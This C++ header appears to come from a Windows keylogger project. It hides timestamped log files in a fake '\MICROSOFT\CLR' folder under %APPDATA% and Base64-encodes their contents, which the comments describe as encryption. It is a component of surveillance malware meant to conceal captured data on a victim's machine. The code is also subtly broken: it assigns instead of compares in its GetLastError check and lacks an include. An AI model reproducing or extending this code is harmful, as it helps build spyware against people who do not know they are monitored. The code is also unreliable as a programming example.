#ifndef IO_H
#define IO_H

#include<string>
#include<cstdlib> //for get environment function
#include<windows.h>
#include "Helper.h"
#include "Base64.h"
#include<fstream>

namespace IO
{
    //for retrieve our designated folder where our logs will be kept.
    std::string GetOurPath (const bool append_seperator=false) //it checks that if backslash is needed at the end of path
    {
        std::string appdata_dir(getenv("APPDATA"));
        std::string full=appdata_dir + "\\MICROSOFT\\CLR"; //we need something to add blackslash to the end
        return full+(append_seperator ? "\\" : "");
    }
    //function for making directory
    //the windows API function creates a directory and return true on success otherwise it may return error if directory already exists or path not found or false call
    bool MkOneDr(std::string path)
    {
        return (bool) CreateDirectory(path.c_str(),NULL) || GetLastError()=ERROR_ALREADY_EXISTS;
    }
    //Backup function for creating directory
    bool MKDir(std::string path)
    {
        for(char &c:path)
            if(c=='\\')
        {
            c='\0';
            if(!MkOneDr(path))
                return false;
            c='\\';
        }
        return true;
    }
    template<class T>
    std::string WriteLog(const T &t) //actual string that create a log file itself
    {
        std::string path=GetOurPath(true);
        Helper::DateTime dt;
        std::string name=dt.GetDateTimeString("_")+".log";
        //it attempts actually to open up a file  and write into a file create an o/p to the file  that's why we use try and catch
        try
        {
            std::ofstream file(path+name);
            if(!file) return "";
            std::ostringstream s;
            s<<"["<<dt.GetDateTimeString()<<"]"<<std::endl<<t<<std::endl;
            std::string data=Base64::EncryptB64(s.str()); //encrypting file
            file<<data;
            if(!file)
                return "";
            file.close();
            return name;
        }
        catch(...)
        {
            return "";
        }
    }
}




#endif // IO_H
